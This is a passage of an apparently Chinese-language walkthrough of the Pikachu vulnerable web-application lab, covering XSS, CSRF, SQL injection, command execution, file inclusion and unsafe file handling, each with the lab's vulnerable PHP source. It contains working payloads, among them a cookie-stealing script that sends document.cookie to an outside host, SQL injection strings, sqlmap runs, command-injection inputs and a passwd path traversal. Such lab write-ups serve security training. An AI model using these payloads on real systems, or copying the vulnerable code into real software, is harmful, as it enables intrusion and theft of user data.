onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行    &lt;/script&gt;    &lt;!--&lt;a href=&quot;&quot; onclick=(&#x27;xss&#x27;)&gt;--&gt;    &lt;form method=&quot;get&quot;&gt;        &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot;  value=&quot;&quot; /&gt;        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;请说出你的伤心往事&quot;/&gt;    &lt;/form&gt;    &lt;div id=&quot;dom&quot;&gt;&lt;/div&gt;&lt;/div&gt;\n\nXSS 盲打漏洞利用XSS 盲打即在不知道后台是否存在 XSS 漏洞的情况下提交 XSS payload ，该 payload 会在后台管理页面被打开时被执行，从而攻击后台管理员以实现攻击目的。直接在该页面的留言板内提交 payload 即可\n// Use your server&lt;script&gt;    document.location = &quot;http://7erry.com/phish?cookie=&quot;+document.cookie;&lt;/script&gt;\n\n漏洞代码解读前端\nif(array_key_exists(&quot;content&quot;,$_POST) &amp;&amp; $_POST[&#x27;content&#x27;]!=null)&#123;    $content=escape($link, $_POST[&#x27;content&#x27;]);    $name=escape($link, $_POST[&#x27;name&#x27;]);    $time=$time=date(&#x27;Y-m-d g:i:s&#x27;);    $query=&quot;insert into xssblind(time,content,name) values(&#x27;$time&#x27;,&#x27;$content&#x27;,&#x27;$name&#x27;)&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1)&#123;        $html.=&quot;&lt;p&gt;谢谢参与，阁下的看法我们已经收到!&lt;/p&gt;&quot;;    &#125;else &#123;        $html.=&quot;&lt;p&gt;ooo.提交出现异常，请重新提交&lt;/p&gt;&quot;;    &#125;&#125;\n\n后台管理页面\nHTML&lt;?php    $query=&quot;select * from xssblind&quot;;    $result=mysqli_query($link, $query);    while($data=mysqli_fetch_assoc($result))&#123;        $html=&lt;&lt;&lt;A            &lt;tr&gt;                &lt;td&gt;&#123;$data[&#x27;id&#x27;]&#125;&lt;/td&gt;                &lt;td&gt;&#123;$data[&#x27;time&#x27;]&#125;&lt;/td&gt;                &lt;td&gt;&#123;$data[&#x27;content&#x27;]&#125;&lt;/td&gt;                &lt;td&gt;&#123;$data[&#x27;name&#x27;]&#125;&lt;/td&gt;                &lt;td&gt;&lt;a href=&quot;admin.php?id=&#123;$data[&#x27;id&#x27;]&#125;&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;            &lt;/tr&gt;        A;        echo $html;    &#125;?&gt;\n\nXSS 过滤 Bypass漏洞利用Fuzz 测试可以得出 &lt;script 字符串被过滤了，但可以大小写混写或干脆使用其它标签进行 Bypass ，如 &lt;ScRiPt&gt;&lt;/sCrIpT&gt;\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;message&#x27;] != null)&#123;    //这里会使用正则对&lt;script进行替换为空,也就是过滤掉    $message=preg_replace(&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;, &#x27;&#x27;, $_GET[&#x27;message&#x27;]);//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,$_GET[&#x27;message&#x27;]);    if($message == &#x27;yes&#x27;)&#123;        $html.=&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p&gt;别说这些&#x27;&#123;$message&#125;&#x27;的话,不要怕,就是干!&lt;/p&gt;&quot;;    &#125;&#125;\n\nXSS htmlspecialchars 转义 Bypass漏洞利用从关卡名就能看出使用了 htmlspecialchars 函数对用户输入进行了转义，但该函数不会对 &#39; 进行转义，Fuzz 测试后发现传入的 message 既会被放在 a 标签的 text 部分，也会被添加为 href 属性值。则可以使引号闭合，借助 onclick 等属性触发 XSS 攻击\npayload\n&#x27;onclick=&#x27;alert(1)`\n\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]))&#123;    if(empty($_GET[&#x27;message&#x27;]))&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;输入点啥吧！&lt;/p&gt;&quot;;    &#125;else &#123;        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&#x27;处理        $message=htmlspecialchars($_GET[&#x27;message&#x27;]);        $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;你的输入已经被记录:&lt;/p&gt;&quot;;        //输入的内容被处理后输出到了input标签的value属性里面,试试:&#x27; onclick=&#x27;alert(111)&#x27;//        $html2.=&quot;&lt;input class=&#x27;input&#x27; type=&#x27;text&#x27; name=&#x27;inputvalue&#x27; readonly=&#x27;readonly&#x27; value=&#x27;&#123;$message&#125;&#x27; style=&#x27;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&#x27;/&gt;&quot;;        $html2.=&quot;&lt;a href=&#x27;&#123;$message&#125;&#x27;&gt;&#123;$message&#125;&lt;/a&gt;&quot;;    &#125;&#125;\n\nXSS href 输出漏洞利用Fuzz 测试后发现输入内容会被转义并作为 a 标签的 href 属性值，但哪怕无法闭合标签，也可以通过 Javascript 伪协议触发 XSS\nJavascript:alert(1)\n\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]))&#123;    if(empty($_GET[&#x27;message&#x27;]))&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;;    &#125;    if($_GET[&#x27;message&#x27;] == &#x27;www.baidu.com&#x27;)&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;;    &#125;else &#123;        //输出在a标签的href属性里面,可以使用javascript协议来执行js        //防御:只允许http,https,其次在进行htmlspecialchars处理        $message=htmlspecialchars($_GET[&#x27;message&#x27;],ENT_QUOTES);        $html.=&quot;&lt;a href=&#x27;&#123;$message&#125;&#x27;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;;    &#125;&#125;\n\nXSS js 输出漏洞利用Fuzz 测试并调试后发现用户输入被动态地生成到了 JavaScript 中，以 payload xsstest 为例，被插入到的 JavaScript 语句为\n$ms = &#x27;xsstest&#x27;\n\n则可使该语句闭合并进行 XSS 攻击\n123&#x27;&lt;/script&gt;&lt;img src=&quot;https://w8hwd8.dnslog.cn&quot;&gt;\n\nDNSLOG 成功回显\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;message&#x27;] !=null)&#123;    $jsvar=$_GET[&#x27;message&#x27;];//    $jsvar=htmlspecialchars($_GET[&#x27;message&#x27;],ENT_QUOTES);    if($jsvar == &#x27;tmac&#x27;)&#123;        $html.=&quot;&lt;img src=&#x27;&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/tmac.jpeg&#x27; /&gt;&quot;;    &#125;&#125;\n\n&lt;script&gt;    $ms=&#x27;&lt;?php echo $jsvar;?&gt;&#x27;;    if($ms.length != 0)&#123;        if($ms == &#x27;tmac&#x27;)&#123;            $(&#x27;#fromjs&#x27;).text(&#x27;tmac确实厉害,看那小眼神..&#x27;)        &#125;else &#123;//            alert($ms);            $(&#x27;#fromjs&#x27;).text(&#x27;无论如何不要放弃心中所爱..&#x27;)        &#125;    &#125;&lt;/script&gt;\n\nCSRF (跨站请求伪造)概述CSRF ( Cross-site request forgery ) 又名跨站请求伪造，它即发生在客户端的 SSRF\nCSRF (get)漏洞利用使用提示中给出的账号进行登陆，然后修改一次账号信息并抓包，发现修改信息业务通过发起 GET 请求执行。修改 GET 请求 URL 并进行测试，攻击成功\n?sex=male&amp;phonenum=123&amp;add=123&amp;email=123@12.com&amp;submit=submit\n\nCSRF (post)漏洞利用与 GET 型 CSRF 攻击利用方式基本一致，只是触发其的方式需要由欺骗受害者点击 URL 修改为需要诱骗受害者使用表单或其它发起 POST 请求的方式\nCSRF Token漏洞利用该关卡实际上仍是 GET 型 CSRF 攻击，但在 GET 请求参数中设置了 token 字段。这种在请求中加入攻击者无法伪造的信息是抵御 CSRF 攻击的有效方式，每次请求都需要提供能够被后台验证通过的 token 。这种情况下的 CSRF 漏洞利用往往需要配合 XSS 获取用户身份信息。一个经典例子是使用CSRF盗取SELF-XSS的Cookie,在此就不过多赘述\nSQL Inject (SQL注入漏洞)概述代码注入漏洞常年霸榜 OWASP TOP 10 。其中数据库注入更是其代表漏洞。SQL 注入又是数据库注入的典型，是 Web 安全最经典的漏洞利用技术。它  主要形成的原因是，在数据交互中，前端的数据传入到后端处理时，后端没有做严格的筛选与过滤，导致传入的被攻击者锁精心构造的恶意数据拼接到 SQL 语句中并被当作 SQL 语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。哪怕目前有很多 ORM 框架都提供了使用参数化技术防止 SQL 注入的方案，但其也存在使用语句拼接的地方,SQL 注入仍有较大的发挥空间\n数字型注入漏洞利用fuzzing payload 1 or 1=1 通过，存在数字型 SQL 注入点，然后一条龙即可\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;id&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入    $id=$_POST[&#x27;id&#x27;];    $query=&quot;select username,email from member where id=$id&quot;;    $result=execute($link, $query);    //这里如果用==1,会严格一点    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $username=$data[&#x27;username&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;hello,&#123;$username&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的user id不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n\n字符型注入漏洞利用fuzzing payload 1&#39; or &#39;1&#39; = &#39;1通过，存在字符型 SQL 注入点，然后一条龙即可\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是字符型，需要考虑闭合    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n\n搜索型注入漏洞利用随意进行搜索发现该页面实现了模糊查询，猜测使用的 SQL 语句为 SELECT * FROM TABLE_NAME WHERE COLUMN_NAME LIKE &quot;&amp;USER_INPUT&amp;&quot; 。fuzzing payload &#39; or 1=1--+ 通过，存在搜索型 SQL 注入点，然后一条龙即可\n\n审计源代码后发现该页面还存在 XSS 漏洞，原因是传入的 username 会直接回显到页面中\n\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是模糊匹配，需要考虑闭合    $query=&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        //彩蛋:这里还有个xss        $html2.=&quot;&lt;p class=&#x27;notice&#x27;&gt;用户名中含有&#123;$_GET[&#x27;name&#x27;]&#125;的结果如下：&lt;br /&gt;&quot;;        while($data=mysqli_fetch_assoc($result))&#123;            $uname=$data[&#x27;username&#x27;];            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;username：&#123;$uname&#125;&lt;br /&gt;uid:&#123;$id&#125; &lt;br /&gt;email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html1.=&quot;&lt;p class=&#x27;notice&#x27;&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;;    &#125;&#125;\n\nXX 型注入漏洞利用fuzzing payload &#39;) or 1=1 --+ 通过，该注入点通过单引号和括号闭合，接下来可一条龙\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    //这里没有做任何处理，直接拼到select里面去了    $name=$_GET[&#x27;name&#x27;];    //这里的变量是字符型，需要考虑闭合    $query=&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)&gt;=1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n\ninsert&#x2F;update 语句注入漏洞利用insert&#x2F;update 语句执行后无法直接获取到数据，也无法使用联表查询。此时往往使用报错注入以外带数据。登陆业务往往是通过 SELECT 语句进行判断的，但 fuzz 测试后发现较难注入，不过有报错信息。注意到该页面存在注册入口，由于注册等业务需要写入数据，因此往往与 insert 等 SQL 语句相关联，可尝试寻找注册页面的注入点。\n在注册页面的必填字段测试 &#39;) 观察报错信息发现 password 字段值被 md5 函数以md5(&#39;PASSWORD_INPUT&#39;) 包裹，username 字段值被 ‘ 包裹。\nfuzzing payload 可爆出数据库名，登陆成功后的信息修改页面与当前注册页面的其余一条龙注入 payload 类似\n//username: 1&#x27; and extractvalue(1,concat(0x5c,database(),0x5c)),1,1,1,1,1)#// password: 123// 也可以用 updatexml 函数// username: 1&#x27; and updatexml(0,concat(0x5c,database(),0x5c),1),1,1,1,1,1)#username=1%27+and+extractvalue%281%2Cconcat%280x5c%2Cdatabase%28%29%2C0x5c%29%29%2C1%2C1%2C1%2C1%2C1%29%23&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit\n\n漏洞代码解读注册页面 ( insert )\nif(isset($_POST[&#x27;submit&#x27;]))&#123;    if($_POST[&#x27;username&#x27;]!=null &amp;&amp;$_POST[&#x27;password&#x27;]!=null)&#123;//      $getdata=escape($link, $_POST);//转义        //没转义,导致注入漏洞,操作类型为insert        $getdata=$_POST;        $query=&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)&quot;;        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1)&#123;            $html.=&quot;&lt;p&gt;注册成功,请返回&lt;a href=&#x27;sqli_login.php&#x27;&gt;登录&lt;/a&gt;&lt;/p&gt;&quot;;        &#125;else &#123;            $html.=&quot;&lt;p&gt;注册失败,请检查下数据库是否还活着&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p&gt;必填项不能为空哦&lt;/p&gt;&quot;;    &#125;&#125;\n\n修改信息页面 ( update )\nif(isset($_POST[&#x27;submit&#x27;]))&#123;    if($_POST[&#x27;sex&#x27;]!=null &amp;&amp; $_POST[&#x27;phonenum&#x27;]!=null &amp;&amp; $_POST[&#x27;add&#x27;]!=null &amp;&amp; $_POST[&#x27;email&#x27;]!=null)&#123;//        $getdata=escape($link, $_POST);        //未转义,形成注入,sql操作类型为update        $getdata=$_POST;        $query=&quot;update member set sex=&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,phonenum=&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,address=&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;,email=&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27; where username=&#x27;&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;&#x27;&quot;;        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0)&#123;            header(&quot;location:sqli_mem.php&quot;);        &#125;else &#123;            $html1.=&#x27;修改失败，请重试&#x27;;        &#125;    &#125;&#125;\n\ndelete 语句注入漏洞利用删除留言的接口为 http://localhost/pikachu/vul/sqli/sqli_del.php?id=，payload 与 insert&#x2F;update 语句类似\n漏洞代码解读if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&#x27;message&#x27;]!=null)&#123;    //插入转义    $message=escape($link, $_POST[&#x27;message&#x27;]);    $query=&quot;insert into message(content,time) values(&#x27;$message&#x27;,now())&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)!=1)&#123;        $html.=&quot;&lt;p&gt;出现异常，提交失败！&lt;/p&gt;&quot;;    &#125;&#125;// if(array_key_exists(&#x27;id&#x27;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;//没对传进来的id进行处理，导致DEL注入if(array_key_exists(&#x27;id&#x27;, $_GET))&#123;    $query=&quot;delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;&quot;;    $result=execute($link, $query);    if(mysqli_affected_rows($link)==1)&#123;        header(&quot;location:sqli_del.php&quot;);    &#125;else&#123;        $html.=&quot;&lt;p style=&#x27;color: red&#x27;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&quot;;    &#125;&#125;\n\nHTTP Headers 注入漏洞利用通过 Header 传参的普通 SQL 注入，正常注即可\n漏洞代码解读//直接获取前端过来的头信息,没人任何处理,留下安全隐患$remoteipadd=$_SERVER[&#x27;REMOTE_ADDR&#x27;];$useragent=$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$httpaccept=$_SERVER[&#x27;HTTP_ACCEPT&#x27;];$remoteport=$_SERVER[&#x27;REMOTE_PORT&#x27;];//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞$query=&quot;insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(&#x27;$is_login_id&#x27;,&#x27;$remoteipadd&#x27;,&#x27;$useragent&#x27;,&#x27;$httpaccept&#x27;,&#x27;$remoteport&#x27;)&quot;;$result=execute($link, $query);\n\n布尔盲注漏洞利用SQLMap 一把梭即可\nsqlmap.exe -u &quot;http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=submit&quot; --current-db --batch\n\n注入结果\nsqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:---Parameter: name (GET)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: name=1&#x27; AND (SELECT 1790 FROM (SELECT(SLEEP(5)))qkmu) AND &#x27;btIw&#x27;=&#x27;btIw&amp;submit=submit    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: name=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7176787071,0x564851436865555a47677356774658544f4f4f6479486a4c506d65746b5975556341797041724361,0x7178717871)-- -&amp;submit=submit---[21:14:04] [INFO] the back-end DBMS is MySQLweb application technology: Apache 2.4.39, PHP, PHP 8.0.2back-end DBMS: MySQL &gt;= 5.0.12[21:14:04] [INFO] fetching current databasecurrent database: &#x27;pikachu&#x27;\n\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    $name=$_GET[&#x27;name&#x27;];//这里没有做任何处理，直接拼到select里面去了    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    //mysqi_query不打印错误描述,即使存在注入,也不好判断    $result=mysqli_query($link, $query);////     $result=execute($link, $query);    if($result &amp;&amp; mysqli_num_rows($result)==1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n\n时间盲注漏洞利用SQLMap 一把梭\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;name&#x27;]!=null)&#123;    $name=$_GET[&#x27;name&#x27;];//这里没有做任何处理，直接拼到select里面去了    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    $result=mysqli_query($link, $query);//mysqi_query不打印错误描述//     $result=execute($link, $query);//    $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;    if($result &amp;&amp; mysqli_num_rows($result)==1)&#123;        while($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            //这里不管输入啥,返回的都是一样的信息,所以更加不好判断            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;    &#125;&#125;\n\n宽字节注入漏洞利用用 %df 消除转义符然后正常注入即可\nfuzzing payload %df&#39; or 1=1# 通过，存在宽字节注入点，可 SQL 注入一条龙\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;name&#x27;]!=null)&#123;    $name = escape($link,$_POST[&#x27;name&#x27;]);    $query=&quot;select id,email from member where username=&#x27;$name&#x27;&quot;;//这里的变量是字符型，需要考虑闭合    //设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题    $set = &quot;set character_set_client=gbk&quot;;    execute($link,$set);    //mysqi_query不打印错误描述    $result=mysqli_query($link, $query);    if(mysqli_num_rows($result) &gt;= 1)&#123;        while ($data=mysqli_fetch_assoc($result))&#123;            $id=$data[&#x27;id&#x27;];            $email=$data[&#x27;email&#x27;];            $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:&#123;$id&#125; &lt;br /&gt;your email is: &#123;$email&#125;&lt;/p&gt;&quot;;        &#125;    &#125;else&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;;    &#125;&#125;\n\nRCE (远程命令&#x2F;代码执行)概述RCE ( Remote Command&#x2F;Code Execute ) 漏洞的出现往往是因为应用系统基于某种业务需要为用户提供了指定的远程命令&#x2F;代码操作的接口，但没有对用户输入做严格的过滤，导致服务器执行了不该执行的命令而造成不良影响\nexec “ping”漏洞利用使用 &amp; 、 &amp;&amp; 、 | 等拼接符号即可执行任意命令，例如 127.0.0.1 &amp; ipconfig\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;    $ip=$_POST[&#x27;ipaddress&#x27;];//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;//         var_dump(php_uname(&#x27;s&#x27;));        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理    &#125;else &#123;        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);    &#125;&#125;\n\nexec “eval”漏洞利用高危函数 eval 会将参数当作 PHP 代码执行，该参数字符串必须是合法的 PHP 代码且必须以分号结尾。以经典 fuzzing payload phpinfo() 为例，可成功获取服务器敏感信息\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;    &#125;&#125;\n\nFiles Inclusion (文件包含漏洞)概述文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：\n\ninclude()\ninclude_once()\nrequire()\nrequire_once()\n\n这些文件包含函数在代码设计中被经常被使用到。\n大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击者会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作\nFile Inclusion ( local )漏洞利用当服务器存在本地文件包含漏洞时，攻击者更倾向于通过包含一些固定的系统配置文件尝试读取系统的敏感信息。除此以外，本地文件包含漏洞常被用以和文件上传漏洞配合，实现等效于远程包含的效果。\n这关可配合目录穿越通过 HTTP GET 参数读取服务器上的任何文件。\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;filename&#x27;]!=null)&#123;    $filename=$_GET[&#x27;filename&#x27;];    include &quot;include/$filename&quot;;//变量传进来直接包含,没做任何的安全限制//     //安全的写法,使用白名单，严格指定包含的文件名//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;//         include &quot;include/$filename&quot;;//     &#125;&#125;\n\nFile Inclusion ( remote )漏洞利用利用方式与 local 一致\n漏洞代码解读if(isset($_GET[&#x27;submit&#x27;]) &amp;&amp; $_GET[&#x27;filename&#x27;]!=null)&#123;    $filename=$_GET[&#x27;filename&#x27;];    include &quot;$filename&quot;;//变量传进来直接包含,没做任何的安全限制&#125;\n\nUnsafe file downloads (不安全的文件下载)概述文件下载功能在很多 web 系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件 response 给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如 ..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd ),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)泄露\nunsafe filedownload漏洞利用配合目录穿越通过 HTTP GET 传参即可下载服务器上任意文件\n漏洞代码解读// $file_name=&quot;cookie.jpg&quot;;$file_path=&quot;download/&#123;$_GET[&#x27;filename&#x27;]&#125;&quot;;//用以解决中文不能显示出来的问题$file_path=iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,$file_path);//首先要判断给定的文件存在与否if(!file_exists($file_path))&#123;    skip(&quot;你要下载的文件不存在，请重新下载&quot;, &#x27;unsafe_down.php&#x27;);    return ;&#125;$fp=fopen($file_path,&quot;rb&quot;);$file_size=filesize($file_path);//下载文件需要用到的头ob_clean();//输出前一定要clean一下，否则图片打不开Header(&quot;Content-type: application/octet-stream&quot;);Header(&quot;Accept-Ranges: bytes&quot;);Header(&quot;Accept-Length:&quot;.$file_size);Header(&quot;Content-Disposition: attachment; filename=&quot;.basename($file_path));$buffer=1024;$file_count=0;//向浏览器返回数据//循环读取文件流,然后返回到浏览器feof确认是否到EOFwhile(!feof($fp) &amp;&amp; $file_count&lt;$file_size)&#123;    $file_con=fread($fp,$buffer);    $file_count+=$buffer;    echo $file_con;&#125;fclose($fp);\n\nUnsafe file uploads (不安全的文件上传)概述文件上传功能在 web 应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被攻击者 webshell 控制\nclient check漏洞利用该页面通过前端代码 ( checkFileExt 函数) 检查上传的文件类型是否为图片。禁用对应 JS 代码忽略或先将文件后缀名改为图片的后缀名再在 MITM 劫持修改上传的文件后缀名即可\n漏洞代码解读if(isset($_POST[&#x27;submit&#x27;]))&#123;//     var_dump($_FILES);    $save_path=&#x27;uploads&#x27;;//指定在当前目录建立一个目录    $upload=upload_client(&#x27;uploadfile&#x27;,$save_path);//调用函数    if($upload[&#x27;return&#x27;])&#123;        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;new_path&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;else&#123;        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;    &#125;&#125;\n\nMIME type ( server check )漏洞利用Web Server 通过 Content-Type HTTP 首部行字段判断接受到的文件类型，故上传时修改该字段值为 image&#x2F;xx 